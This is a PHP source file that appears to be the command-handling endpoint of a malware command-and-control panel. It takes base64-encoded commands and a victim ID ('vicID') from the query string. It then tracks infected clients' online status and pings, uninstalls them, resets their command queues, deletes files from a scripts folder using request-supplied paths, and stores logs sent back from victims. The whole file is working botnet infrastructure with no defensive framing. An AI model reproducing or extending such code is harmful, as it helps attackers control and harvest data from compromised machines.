<?php
include_once 'classes/Database.php';
include_once 'classes/Clients.php';
include_once 'classes/Utils.php';

$utils = new Utils;

$client = new Clients;

$command = $utils->sanitize(base64_decode($_GET['command']));
$ID = $utils->sanitize(base64_decode($_GET['vicID']));
$data = $client->getClient($ID);

$A = explode("|BN|", $utils->sanitize($command));

switch ($A[0]) {
	case "Uninstall":
		$client->removeClient($ID);
		break;

	case "CleanCommands":
		$client->updateCommands($ID, base64_encode("Ping"));
		break;

	case "Offline":
		$client->updateStatus($ID, "Offline");
		break;

	case "Online":
		$client->updateStatus($ID, "Online");
		break;

	case 'Ping':
		$client->updateCommands($ID, "Ping");
		$client->pinged($ID, $data->pings);
		break;

	case 'DeleteScript':
		try {
			@unlink(realpath($utils->sanitize("scripts/" . trim($A[1], "./"))));
		} catch (Exception $e) {
		}
		break;
	case "NewLog":
		$client->new_log($ID, $utils->sanitize($A[1]), $utils->sanitize($A[2]));
		break;
	default:
		break;
}
